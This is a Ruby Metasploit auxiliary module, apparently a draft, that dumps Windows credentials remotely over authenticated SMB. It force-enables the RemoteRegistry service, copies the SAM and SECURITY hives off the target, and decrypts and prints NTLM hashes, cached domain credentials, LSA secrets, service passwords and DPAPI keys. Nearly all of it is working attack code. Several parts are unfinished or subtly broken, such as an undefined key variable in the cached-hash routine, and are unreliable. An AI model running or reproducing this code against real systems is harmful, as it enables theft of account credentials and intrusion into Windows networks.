##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/registry_parser'

class MetasploitModule < Msf::Auxiliary
  #Rank = NormalRanking

  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::DCERPC

  # TODO: move everything that is crypto-related in Msf::Post::Windows::Priv to a separate library (Windows crypto helper?)
  include Msf::Post::Windows::Priv

  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Windows Secrets Dump',
        'Description'    => %q(
          Performs various techniques to dump hashes from the
          remote machine without executing any agent there.
          For SAM and LSA Secrets (including cached creds)
          we try to read as much as we can from the registry
          and then we save the hives in the target system
          (%SYSTEMROOT%\\Temp dir) and read the rest of the
          data from there.
          For NTDS.dit we either:
            a. Get the domain users list and get its hashes
               and Kerberos keys using [MS-DRDS] DRSGetNCChanges()
               call, replicating just the attributes we need.
            b. Extract NTDS.dit via vssadmin executed  with the
               smbexec approach.
               It's copied on the temp dir and parsed remotely.

          The script initiates the services required for its working
          if they are not available (e.g. Remote Registry, even if it is
          disabled). After the work is done, things are restored to the
          original state.
        ),
        'License'        => MSF_LICENSE,
        'Author'         =>
        [
          'Alberto Solino',
          'Christophe De La Fuente'
        ],
        'Actions'        => [
          [ 'Default Action', 'Description' => 'This does something' ],
          [ 'Another Action', 'Description' => 'This does a different thing' ]
        ],
        # The action(s) that will run as background job
        'PassiveActions' => [
          'Another Action'
        ],
        'DefaultAction'  => 'Default Action'
      )
    )

    register_options( [ Opt::RPORT(445) ] )

    @service_should_be_stopped = false
    @service_should_be_disabled = false
    @lsa_vista_style = true
  end

  def unhexlify(hex_str)
    hex_str.scan(/../).collect { |c| c.to_i(16).chr }.join
  end

  def hexlify(bin_str)
    bin_str.scan(/./).collect { |c| c[0].ord.to_s(16).rjust(2, '0') }.join
  end

  def enable_registry
    svc_handle = @svcctl.open_service_w(@scm_handle, 'RemoteRegistry')
    svc_status = @svcctl.query_service_status(svc_handle)
    case svc_status.dw_current_state
    when RubySMB::Dcerpc::Svcctl::SERVICE_RUNNING
      print_status('Service RemoteRegistry is already running')
    when RubySMB::Dcerpc::Svcctl::SERVICE_STOPPED
      print_status('Service RemoteRegistry is in stopped state')
      svc_config = @svcctl.query_service_config(svc_handle)
      if svc_config.dw_start_type == RubySMB::Dcerpc::Svcctl::SERVICE_DISABLED
        print_status('Service RemoteRegistry is disabled, enabling it...')
        @svcctl.change_service_config_w(svc_handle, start_type: RubySMB::Dcerpc::Svcctl::SERVICE_DEMAND_START)
        @service_should_be_disabled = true
      end
      print_status('Starting service...')
      @svcctl.start_service_w(svc_handle)
      @service_should_be_stopped = true
    else
      print_error('Unable to get the service RemoteRegistry state')
    end
  ensure
    @svcctl.close_service_handle(svc_handle) if svc_handle
  end

  def get_boot_key
    vprint_status('Retrieving bootKey')
    root_key_handle = @winreg.open_root_key('HKLM')

    boot_key = ''.b
    ['JD','Skew1','GBG','Data'].each do |key|
      sub_key = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\#{key}"
      vprint_status("Retrieving class info for #{sub_key}")
      subkey_handle = @winreg.open_key(root_key_handle, sub_key)
      query_info_key_response = @winreg.query_info_key(subkey_handle)
      boot_key << query_info_key_response.lp_class.to_s.encode(Encoding::ASCII_8BIT)
      @winreg.close_key(subkey_handle)
      subkey_handle = nil
    ensure
      @winreg.close_key(subkey_handle) if subkey_handle
    end

    transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]
    boot_key = unhexlify(boot_key)
    boot_key = transforms.map { |i| boot_key[i] }.join
    print_good("Target system bootKey: 0x#{hexlify(boot_key)}")
    boot_key
  ensure
    @winreg.close_key(root_key_handle) if root_key_handle
  end

  def lm_hash_not_stored?
    vprint_status('Checking NoLMHash Policy')
    res = @winreg.read_registry_key_value('HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa', 'NoLmHash', bind: false)
    if res == 1
      vprint_status('LMHashes are not being stored')
      return true
    else
      vprint_status('LMHashes are being stored')
      return false
    end
  end

  def save_registry_key(hive_name)
    vprint_status("Create #{hive_name} key")
    root_key_handle = @winreg.open_root_key('HKLM')
    new_key_handle = @winreg.create_key(root_key_handle, hive_name)

    file_name = "#{Rex::Text.rand_text_alphanumeric(8)}.tmp"
    vprint_status("Save key to #{file_name}")
    @winreg.save_key(new_key_handle, file_name)
    file_name
  ensure
    @winreg.close_key(new_key_handle) if new_key_handle
    @winreg.close_key(root_key_handle) if root_key_handle
  end

  def retrieve_hive(hive_name)
    file_name = save_registry_key(hive_name)
    tree2 = simple.client.tree_connect("\\\\#{datastore['RHOST']}\\ADMIN$")
    file = tree2.open_file(filename: "System32\\#{file_name}", delete: true, read: true)
    file.read
  ensure
    file.delete if file
    file.close if file
    tree2.disconnect! if tree2
  end

  def save_sam
    print_status('Saving remote SAM database')
    retrieve_hive('SAM')
  end

  def save_security
    print_status('Saving remote SECURITY database')
    retrieve_hive('SECURITY')
  end

  def save_ntds
    # TODO
  end

  def dump_ntds(ntds, boot_key)
    # TODO
  end

  def get_hboot_key(boot_key)
    vprint_status('Calculating HashedBootKey from SAM')
    qwerty = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
    digits = "0123456789012345678901234567890123456789\0"

    _value_type, value_data = @reg_parser.get_value('SAM\\Domains\\Account', 'F')

    revision = value_data[0x68, 4].unpack('V')[0]

    case revision
    when 1
      hash = Digest::MD5.new
      hash.update(value_data[0x70, 16] + qwerty + boot_key + digits)

      rc4 = OpenSSL::Cipher.new("rc4")
      rc4.key = hash.digest
      hboot_key  = rc4.update(value_data[0x80, 32])
      hboot_key << rc4.final
      hboot_key
    when 2
      aes = OpenSSL::Cipher.new('aes-128-cbc')
      aes.key = boot_key
      aes.padding = 0
      aes.decrypt
      aes.iv = value_data[0x78, 16]
      aes.update(value_data[0x88, 16]) # we need only 16 bytes
    else
      raise NotImplementedError, "Unknown hboot_key revision: #{revision}"
    end
  end

  def enum_key(key)
    parent_key = @reg_parser.find_key(key)
    return nil unless parent_key
    return @reg_parser.enum_key(parent_key)
  end

  def enum_values(key)
    key_obj = @reg_parser.find_key(key)
    return nil unless key_obj
    return @reg_parser.enum_values(key_obj)
  end

  def get_user_keys
    users = {}
    users_key = 'SAM\\Domains\\Account\\Users'
    rids = enum_key(users_key)
    rids.delete('Names')

    rids.each do |rid|
      _value_type, value_data = @reg_parser.get_value("#{users_key}\\#{rid}", 'V')
      users[rid.to_i(16)] ||= {}
      users[rid.to_i(16)][:V] = value_data

      #Attempt to get Hints (from Win7/Win8 Location)
      _value_type, value_data = @reg_parser.get_value("#{users_key}\\#{rid}", 'UserPasswordHint')
      users[rid.to_i(16)][:UserPasswordHint] = value_data
    end

    # Retrieve the user names for each RID
    # TODO use proper structure to do this, since the user names are included in V data
    names = enum_key("#{users_key}\\Names")
    names.each do |name|
      value_type, value_data = @reg_parser.get_value("#{users_key}\\Names\\#{name}", '')
      users[value_type] ||= {}
      users[value_type][:Name] = name

      #Attempt to get Hints (from WinXP Location) only if it's not set yet
      #if users[rid][:UserPasswordHint].nil?
      #  begin
      #    uk_hint = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\#{usr}", KEY_READ)
      #    users[rid][:UserPasswordHint] = uk_hint.query_value("").data
      #  rescue ::Rex::Post::Meterpreter::RequestError
      #    users[rid][:UserPasswordHint] = nil
      #  end
      #end
    end

    users
  end

  # TODO: move this to a separate library (Windows crypto helper?)
  def decrypt_user_keys(hboot_key, users)
    sam_lmpass   = "LMPASSWORD\x00"
    sam_ntpass   = "NTPASSWORD\x00"
    sam_empty_lm = ["aad3b435b51404eeaad3b435b51404ee"].pack("H*")
    sam_empty_nt = ["31d6cfe0d16ae931b73c59d7e0c089c0"].pack("H*")

    users.each do |rid, user|
      hashlm_off = user[:V][0x9c, 4].unpack("V")[0] + 0xcc
      hashlm_len = user[:V][0xa0, 4].unpack("V")[0]
      hashlm_enc = user[:V][hashlm_off, hashlm_len]

      hashnt_off = user[:V][0xa8, 4].unpack("V")[0] + 0xcc
      hashnt_len = user[:V][0xac, 4].unpack("V")[0]
      hashnt_enc = user[:V][hashnt_off, hashnt_len]

      user[:hashlm] = decrypt_user_hash(rid, hboot_key, hashlm_enc, sam_lmpass, sam_empty_lm)
      user[:hashnt] = decrypt_user_hash(rid, hboot_key, hashnt_enc, sam_ntpass, sam_empty_nt)
    end

    users
  end

  # TODO: move this to a separate library (Windows crypto helper?)
  def rid_to_key(rid)

    s1 = [rid].pack("V")
    s1 << s1[0,3]

    s2b = [rid].pack("V").unpack("C4")
    s2 = [s2b[3], s2b[0], s2b[1], s2b[2]].pack("C4")
    s2 << s2[0,3]

    [convert_des_56_to_64(s1), convert_des_56_to_64(s2)]
  end

  # TODO: move this to a separate library (Windows crypto helper?)
  def decrypt_user_hash(rid, hboot_key, enc_hash, pass, default)
    revision = enc_hash[2, 2].unpack('v')[0]

    case revision
      when 1
        if enc_hash.length < 20
          return default
        end

        md5 = Digest::MD5.new
        md5.update(hboot_key[0,16] + [rid].pack("V") + pass)

        rc4 = OpenSSL::Cipher.new('rc4')
        rc4.key = md5.digest
        okey = rc4.update(enc_hash[4, 16])
      when 2
        if enc_hash.length < 40
          return default
        end

        aes = OpenSSL::Cipher.new('aes-128-cbc')
        aes.key = hboot_key[0, 16]
        aes.padding = 0
        aes.decrypt
        aes.iv = enc_hash[8, 16]
        okey = aes.update(enc_hash[24, 16]) # we need only 16 bytes
      else
        print_error("Unknown user hash revision: #{revision}")
        return default
    end

    des_k1, des_k2 = rid_to_key(rid)

    d1 = OpenSSL::Cipher.new('des-ecb')
    d1.padding = 0
    d1.key = des_k1

    d2 = OpenSSL::Cipher.new('des-ecb')
    d2.padding = 0
    d2.key = des_k2

    d1o  = d1.decrypt.update(okey[0,8])
    d1o << d1.final

    d2o  = d2.decrypt.update(okey[8,8])
    d1o << d2.final
    d1o + d2o
  end

  def dump_sam_hashes(sam_data, boot_key)
    @reg_parser = Msf::Post::Windows::RegistryParser.new(sam_data)
    hboot_key = get_hboot_key(boot_key)
    users = get_user_keys
    decrypt_user_keys(hboot_key, users)

    print_status("Dumping password hints...")
    print_line
    hint_count = 0
    users.keys.sort{ |a,b| a <=> b }.each do |rid|
      #If we have a hint then print it
      if !users[rid][:UserPasswordHint].nil? && users[rid][:UserPasswordHint].length > 0
        print_line("#{users[rid][:Name]}: \"#{users[rid][:UserPasswordHint]}\"")
        hint_count += 1
      end
    end
    print_line("No users with password hints on this system") if hint_count == 0
    print_line

    print_status("Dumping password hashes...")
    print_line
    users.keys.sort{ |a,b| a <=> b }.each do |rid|
      print_line("#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::")
    end
    print_line()

    # Assemble the information about the SMB service for this host
    #service_data = {
    #    address: rhost
    #    port: 445,
    #    service_name: 'smb',
    #    protocol: 'tcp',
    #    workspace_id: myworkspace_id
    #}

    ## Assemble data about the credential objects we will be creating
    #credential_data = {
    #    origin_type: :session,
    #    session_id: session_db_id,
    #    post_reference_name: self.refname,
    #    private_type: :ntlm_hash
    #}

    # Merge the service data into the credential data
    #credential_data.merge!(service_data)

    #users.keys.sort{ |a,b| a <=> b }.each do |rid|
      #hashstring = "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::"

      # Add the details for this specific credential
      #credential_data[:private_data] = users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0]
      #credential_data[:username]     = users[rid][:Name].downcase

      # Create the Metasploit::Credential::Core object
      #credential_core = create_credential(credential_data)

      # Assemble the options hash for creating the Metasploit::Credential::Login object
      #login_data ={
      #  core: credential_core,
      #  status: Metasploit::Model::Login::Status::UNTRIED
      #}

      # Merge in the service data and create our Login
      #login_data.merge!(service_data)
      #login = create_credential_login(login_data)
      #print_line hashstring
    #end
  end

  def get_lsa_secret_key(boot_key)
    vprint_status('Decrypting LSA Key')
    vprint_status("Trying 'V72' style...")
    vprint_status("Getting PolEKList...")
    _value_type, value_data = @reg_parser.get_value('\\Policy\\PolEKList', 'default')
    if value_data
      print_status("Vista or above system")

      lsa_key = decrypt_lsa_data(value_data, boot_key)
      lsa_key = lsa_key[68,32]
    else
      vprint_status("Getting PolSecretEncryptionKey...")
      _value_type, value_data = @reg_parser.get_value('\\Policy\\PolSecretEncryptionKey', 'default')

      # If that didn't work, then we're out of luck
      return nil if value_data.nil?

      print_status("XP or below system")
      @lsa_vista_style = false

      md5x = Digest::MD5.new()
      md5x << boot_key
      (1..1000).each do
        md5x << value_data[60,16]
      end

      rc4 = OpenSSL::Cipher.new("rc4")
      rc4.key = md5x.digest
      lsa_key  = rc4.update(value_data[12,48])
      lsa_key << rc4.final
      lsa_key = lsa_key[0x10..0x1F]
    end

    vprint_good(lsa_key.unpack("H*")[0])
    return lsa_key
  end

  def get_nlkm_secret_key(lsa_key)
    vprint_status('Decrypting NL$KM')
    _value_type, value_data = @reg_parser.get_value('\\Policy\\Secrets\\NL$KM\\CurrVal', 'default')
    return nil unless value_data

    if lsa_vista_style?
      nlkm_dec = decrypt_lsa_data(value_data, lsa_key)
    else
      if sysinfo['Architecture'] == ARCH_X64
        nlkm_dec = decrypt_secret_data(value_data[0x10..-1], lsa_key)
      else # 32 bits
        nlkm_dec = decrypt_secret_data(value_data[0xC..-1], lsa_key)
      end
    end

    return nlkm_dec
  end

  def parse_cache_entry(cache_data)
    j = Struct.new(
      :userNameLength,
      :domainNameLength,
      :effectiveNameLength,
      :fullNameLength,
      :logonScriptLength,
      :profilePathLength,
      :homeDirectoryLength,
      :homeDirectoryDriveLength,
      :userId,
      :primaryGroupId,
      :groupCount,
      :logonDomainNameLength,
      :logonDomainIdLength,
      :lastAccess,
      :last_access_time,
      :revision,
      :sidCount,
      :valid,
      :iterationCount,
      :sifLength,
      :logonPackage,
      :dnsDomainNameLength,
      :upnLength,
      :ch,
      :enc_data
    )

    s = j.new()

    s.userNameLength = cache_data[0,2].unpack("v")[0]
    s.domainNameLength =  cache_data[2,2].unpack("v")[0]
    s.effectiveNameLength = cache_data[4,2].unpack("v")[0]
    s.fullNameLength = cache_data[6,2].unpack("v")[0]
    s.logonScriptLength = cache_data[8,2].unpack("v")[0]
    s.profilePathLength = cache_data[10,2].unpack("v")[0]
    s.homeDirectoryLength = cache_data[12,2].unpack("v")[0]
    s.homeDirectoryDriveLength = cache_data[14,2].unpack("v")[0]

    s.userId = cache_data[16,4].unpack("V")[0]
    s.primaryGroupId = cache_data[20,4].unpack("V")[0]
    s.groupCount = cache_data[24,4].unpack("V")[0]
    s.logonDomainNameLength = cache_data[28,2].unpack("v")[0]
    s.logonDomainIdLength = cache_data[30,2].unpack("v")[0]

    #Removed ("Q") unpack and replaced as such
    thi = cache_data[32,4].unpack("V")[0]
    tlo = cache_data[36,4].unpack("V")[0]
    q = (tlo.to_s(16) + thi.to_s(16)).to_i(16)
    s.lastAccess = ((q / 10000000) - 11644473600)

    s.revision = cache_data[40,4].unpack("V")[0]
    s.sidCount = cache_data[44,4].unpack("V")[0]
    s.valid = cache_data[48,2].unpack("v")[0]
    s.iterationCount = cache_data[50,2].unpack("v")[0]
    s.sifLength = cache_data[52,4].unpack("V")[0]

    s.logonPackage  = cache_data[56,4].unpack("V")[0]
    s.dnsDomainNameLength = cache_data[60,2].unpack("v")[0]
    s.upnLength = cache_data[62,2].unpack("v")[0]

    s.ch = cache_data[64,16]
    s.enc_data = cache_data[96..-1]

    return s
  end

  def decrypt_hash_vista(edata, nlkm, ch)
    aes = OpenSSL::Cipher.new('aes-128-cbc')
    aes.key = nlkm[16...32]
    aes.padding = 0
    aes.decrypt
    aes.iv = ch

    decrypted = ""
    (0...edata.length).step(16) do |i|
      decrypted << aes.update(edata[i,16])
    end

    return decrypted
  end

  def decrypt_hash(edata, nlkm, ch)
    rc4key = OpenSSL::HMAC.digest(OpenSSL::Digest.new('md5'), nlkm, ch)
    rc4 = OpenSSL::Cipher.new("rc4")
    rc4.key = rc4key
    decrypted  = rc4.update(edata)
    decrypted << rc4.final

    return decrypted
  end

  def parse_decrypted_cache(dec_data, s)
    i = 0
    hash = dec_data[i,0x10]
    i += 72

    username = dec_data[i,s.userNameLength].split("\x00\x00").first.gsub("\x00", '')
    i+=s.userNameLength
    i+=2 * ( ( s.userNameLength / 2 ) % 2 )

    vprint_good "Username\t\t: #{username}"
    vprint_good "Hash\t\t: #{hash.unpack("H*")[0]}"

    if lsa_vista_style?
      if (s.iterationCount > 10240)
        iterationCount = s.iterationCount & 0xfffffc00
      else
        iterationCount = s.iterationCount * 1024
      end
      vprint_good "Iteration count\t: #{s.iterationCount} -> real #{iterationCount}"
    end

    last = Time.at(s.lastAccess)
    vprint_good "Last login\t\t: #{last.strftime("%F %T")} "

    domain = dec_data[i,s.domainNameLength+1]
    i+=s.domainNameLength

    if( s.dnsDomainNameLength != 0)
      dnsDomainName = dec_data[i,s.dnsDomainNameLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.dnsDomainNameLength
      i+=2 * ( ( s.dnsDomainNameLength / 2 ) % 2 )
      vprint_good "DNS Domain Name\t: #{dnsDomainName}"
    end

    if( s.upnLength != 0)
      upn = dec_data[i,s.upnLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.upnLength
      i+=2 * ( ( s.upnLength / 2 ) % 2 )
      vprint_good "UPN\t\t\t: #{upn}"
    end

    if( s.effectiveNameLength != 0 )
      effectiveName = dec_data[i,s.effectiveNameLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.effectiveNameLength
      i+=2 * ( ( s.effectiveNameLength / 2 ) % 2 )
      vprint_good "Effective Name\t: #{effectiveName}"
    end

    if( s.fullNameLength != 0 )
      fullName = dec_data[i,s.fullNameLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.fullNameLength
      i+=2 * ( ( s.fullNameLength / 2 ) % 2 )
      vprint_good "Full Name\t\t: #{fullName}"
    end

    if( s.logonScriptLength != 0 )
      logonScript = dec_data[i,s.logonScriptLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.logonScriptLength
      i+=2 * ( ( s.logonScriptLength / 2 ) % 2 )
      vprint_good "Logon Script\t\t: #{logonScript}"
    end

    if( s.profilePathLength != 0 )
      profilePath = dec_data[i,s.profilePathLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.profilePathLength
      i+=2 * ( ( s.profilePathLength / 2 ) % 2 )
      vprint_good "Profile Path\t\t: #{profilePath}"
    end

    if( s.homeDirectoryLength != 0 )
      homeDirectory = dec_data[i,s.homeDirectoryLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.homeDirectoryLength
      i+=2 * ( ( s.homeDirectoryLength / 2 ) % 2 )
      vprint_good "Home Directory\t\t: #{homeDirectory}"
    end

    if( s.homeDirectoryDriveLength != 0 )
      homeDirectoryDrive = dec_data[i,s.homeDirectoryDriveLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.homeDirectoryDriveLength
      i+=2 * ( ( s.homeDirectoryDriveLength / 2 ) % 2 )
      vprint_good "Home Directory Drive\t: #{homeDirectoryDrive}"
    end

    vprint_good "User ID\t\t: #{s.userId}"
    vprint_good "Primary Group ID\t: #{s.primaryGroupId}"

    relativeId = []
    while (s.groupCount > 0) do
      # Todo: parse attributes
      relativeId << dec_data[i,4].unpack("V")[0]
      i+=4
      attributes = dec_data[i,4].unpack("V")[0]
      i+=4
      s.groupCount-=1
    end

    vprint_good "Additional groups\t: #{relativeId.join ' '}"

    if( s.logonDomainNameLength != 0 )
      logonDomainName = dec_data[i,s.logonDomainNameLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.logonDomainNameLength
      i+=2 * ( ( s.logonDomainNameLength / 2 ) % 2 )
      vprint_good "Logon domain name\t: #{logonDomainName}"
    end

      @credentials <<
        [
          username,
          hash.unpack("H*")[0],
          iterationCount,
          logonDomainName,
          dnsDomainName,
          last.strftime("%F %T"),
          upn,
          effectiveName,
          fullName,
          logonScript,
          profilePath,
          homeDirectory,
          homeDirectoryDrive,
          s.primaryGroupId,
          relativeId.join(' '),
        ]

    vprint_good "----------------------------------------------------------------------"
    if lsa_vista_style?
      return "#{username.downcase}:$DCC2$#{iterationCount}##{username.downcase}##{hash.unpack("H*")[0]}:#{dnsDomainName}:#{logonDomainName}\n"
    else
      return "#{username.downcase}:M$#{username.downcase}##{hash.unpack("H*")[0]}:#{dnsDomainName}:#{logonDomainName}\n"
    end
  end

  def dump_cached_hashes(security_data, boot_key)
    @reg_parser = Msf::Post::Windows::RegistryParser.new(security_data)

    values = enum_values('\\Cache')
    return unless values

    values.delete('NL$Control')
    if values.delete('NL$IterationCount')
      _value_type, value_data = @reg_parser.get_value('\\Cache', 'NL$IterationCount')
      if value_data > 10240
          iterationCount = value_data & 0xfffffc00
      else
          iterationCount = value_data * 1024
      end
    end

    lsa_key = get_lsa_secret_key(boot_key)
    nlkm_key = get_nlkm_secret_key(lsa_key)

    values.each do |value|
      vprint_status("Looking into #{value}")
      _value_type, value_data = @reg_parser.get_value('\\Cache', value)
      nl = value_data

      cache = parse_cache_entry(nl)

      if ( cache.userNameLength > 0 )
        vprint_status("Reg entry: #{nl.unpack("H*")[0]}")
        vprint_status("Encrypted data: #{cache.enc_data.unpack("H*")[0]}")
        vprint_status("Ch:  #{cache.ch.unpack("H*")[0]}")

        if lsa_vista_style?
          dec_data = decrypt_hash_vista(cache.enc_data, nlkm, cache.ch)
        else
          dec_data = decrypt_hash(cache.enc_data, nlkm, cache.ch)
        end

        vprint_status("Decrypted data: #{dec_data.unpack("H*")[0]}")

        print_good(parse_decrypted_cache(dec_data, cache))
      end
    end

    lsa_key
  end

  def get_service_account(service_name)
    return nil unless @svcctl
    vprint_status("Getting #{service_name} service account")
    svc_handle = @svcctl.open_service_w(@scm_handle, service_name)
    svc_config = @svcctl.query_service_config(svc_handle)
    return nil if svc_config.lp_service_start_name == :null
    svc_config.lp_service_start_name.to_s
  ensure
    @svcctl.close_service_handle(svc_handle) if svc_handle
  end

  def get_default_login_account
    vprint_status('Getting default login account')
    username = @winreg.read_registry_key_value('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 'DefaultUserName', bind: false)
    return nil if username.nil? || username.empty?

    domain = @winreg.read_registry_key_value('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 'DefaultDomainName', bind: false)

    username = "#{domain}\\#{username}" if domain
    username
  rescue RubySMB::Dcerpc::Error::WinregError
    return nil
  end

  def print_secret(name, secret_item)
    unless secret_item
        vprint_status("Discarding secret #{name}, NULL Data")
        return
    end

    if secret_item.start_with?("\x00\x00".b)
        vprint_status("Discarding secret #{name}, all zeros")
        return
    end

    upper_name = name.upcase
    print_line("#{name}")

    secret = ''

    if upper_name.start_with?('_SC_')
      # Service name, a password might be there
      # Let's first try to decode the secret
      begin
        str_decoded = secret_item.force_encoding('utf-16le').encode(Encoding::ASCII_8BIT)
      rescue
      else
        # We have to get the account the service runs under
        account = get_service_account(name[4..-1])
        if account
          secret = "#{account}:"
        else
          secret = '(Unknown User):'
        end
      end
      secret += str_decoded
    elsif upper_name.start_with?('DEFAULTPASSWORD')
      begin
        str_decoded = secret_item.force_encoding('utf-16le').encode(Encoding::ASCII_8BIT)
      rescue
      else
        # We have to get the account this password is for
        account = get_default_login_account
        if account
          secret = "#{account}:"
        else
          secret = '(Unknown User):'
        end
      end
      secret += str_decoded
    elsif upper_name.start_with?('ASPNET_WP_PASSWORD')
      begin
        str_decoded = secret_item.force_encoding('utf-16le').encode(Encoding::ASCII_8BIT)
      rescue
      else
        secret = "ASPNET: #{str_decoded}"
      end
    elsif upper_name.start_with?('DPAPI_SYSTEM')
      # Decode the DPAPI Secrets
      machine_key = secret_item[4,20]
      user_key = secret_item[24,20]
      secret = "dpapi_machinekey: 0x#{hexlify(machine_key)}\ndpapi_userkey: 0x#{hexlify(user_key)}"
    elsif upper_name.start_with?('$MACHINE.ACC')
      # TODO
    end

    if secret != ''
      print_line(secret)
    else
      print_line(Rex::Text.to_hex_dump(secret_item).strip)
      print_line("Hex string: #{hexlify(secret_item)}")
    end
    print_line
  end

  def dump_lsa_secrets(lsa_key)
    print_status('Dumping LSA Secrets')

    keys = enum_key('\\Policy\\Secrets')
    return unless keys

    keys.delete('NL$Control')

    keys.each do |key|
      vprint_status("Looking into #{key}")
      _value_type, value_data = @reg_parser.get_value("\\Policy\\Secrets\\#{key}\\CurrVal", 'default')
      encrypted_secret = value_data

      next unless encrypted_secret
      if lsa_vista_style?
        decrypted = decrypt_lsa_data(encrypted_secret, lsa_key)
      else
        if sysinfo['Architecture'] == ARCH_X64
          encrypted_secret = encrypted_secret[0x10..-1]
        else
          encrypted_secret = encrypted_secret[0xC..-1]
        end
        decrypted = decrypt_secret_data(encrypted_secret, lsa_key)
      end
      next unless decrypted.length > 0

      secret_size = decrypted[0,4].unpack('<L').first
      secret = decrypted[16, secret_size]

      print_secret(key, secret)
    end
  end

  def do_cleanup
    print_status('Cleaning up...')
    if @service_should_be_stopped
      print_status('Stopping service RemoteRegistry...')
      svc_handle = @svcctl.open_service_w(@scm_handle, 'RemoteRegistry')
      @svcctl.control_service(svc_handle, RubySMB::Dcerpc::Svcctl::SERVICE_CONTROL_STOP)
    end

    if @service_should_be_disabled
      print_status('Disabling service RemoteRegistry...')
      @svcctl.change_service_config_w(svc_handle, start_type:  RubySMB::Dcerpc::Svcctl::SERVICE_DISABLED)
    end
  ensure
    @svcctl.close_service_handle(svc_handle) if svc_handle
  end

  def open_sc_manager
    vprint_status("Opening Service Control Manager")
    @svcctl = @tree.open_file(filename: 'svcctl', write: true, read: true)

    vprint_status("Binding to \\svcctl...")
    @svcctl.bind(endpoint: RubySMB::Dcerpc::Svcctl)
    vprint_good("Bound to \\svcctl")

    @svcctl.open_sc_manager_w(rhost)
  end

  def run
    print_status("Running the simple auxiliary module with action #{action.name}")

    connect
    unless simple.client.is_a?(RubySMB::Client)
      fail_with( Module::Failure::Unknown,
        "RubySMB client must be used for this (current client is"\
        "#{simple.client.class.name}). Make sure 'SMB::ProtocolVersion' advanced"\
        "option contains at least one SMB version greater then SMBv1 (e.g. "\
        "'set SMB::ProtocolVersion 1,2,3')."
      )
    end
    smb_login
    begin
      @tree = simple.client.tree_connect("\\\\#{datastore['RHOST']}\\IPC$")
    rescue RubySMB::Error::RubySMBError => e
      fail_with(Module::Failure::Unreachable,  "Unable to connect to the remote IPC$ share ([#{e.class}] #{e}).")
    end

    begin
      @scm_handle = open_sc_manager
      enable_registry if @scm_handle
    rescue RubySMB::Error::RubySMBError => e
      print_error("Unable to connect to the remote Service Control Manager. It will fail if the 'RemoteRegistry' service is stopped or disabled ([#{e.class}] #{e}).")
    end

    begin
      enable_registry if @scm_handle
    rescue RubySMB::Error::RubySMBError => e
      print_error("Error when checking/enabling the 'RemoteRegistry' service. It will fail if it is stopped or disabled ([#{e.class}] #{e}).")
    end

    begin
      @winreg = @tree.open_file(filename: 'winreg', write: true, read: true)
      @winreg.bind(endpoint: RubySMB::Dcerpc::Winreg)
    rescue RubySMB::Error::RubySMBError => e
      fail_with(Module::Failure::Unreachable, "Error when connecting to 'winreg' named pipe ([#{e.class}] #{e}).")
    end

    boot_key = get_boot_key
    @lm_hash_not_stored = lm_hash_not_stored?

    begin
      sam = save_sam
      dump_sam_hashes(sam, boot_key)
    rescue RubySMB::Error::RubySMBError => e
      print_error("Error when dumping SAM hashes ([#{e.class}] #{e}).")
    end

    begin
      security = save_security
      lsa_key = dump_cached_hashes(security, boot_key)
      dump_lsa_secrets(lsa_key)
    rescue RubySMB::Error::RubySMBError => e
      print_error("Error when dumping LSA secrets ([#{e.class}] #{e}).")
    end

    begin
      ntds = save_ntds
      dump_ntds(ntds, boot_key)
    rescue RubySMB::Error::RubySMBError => e
      print_error("Error when dumping NTDS.dit secrets ([#{e.class}] #{e}).")
    end

    do_cleanup
  rescue RubySMB::Error::RubySMBError => e
    fail_with(Module::Failure::UnexpectedReply, "[#{e.class}] #{e}")
  rescue Exception => e
    do_cleanup
    raise e
  ensure
    if @svcctl
      @svcctl.close_service_handle(@scm_handle) if @scm_handle
      @svcctl.close
    end
    @winreg.close if @winreg
    @tree.disconnect! if @tree
    simple.client.disconnect! if simple.client.is_a?(RubySMB::Client)
    disconnect
  end
end

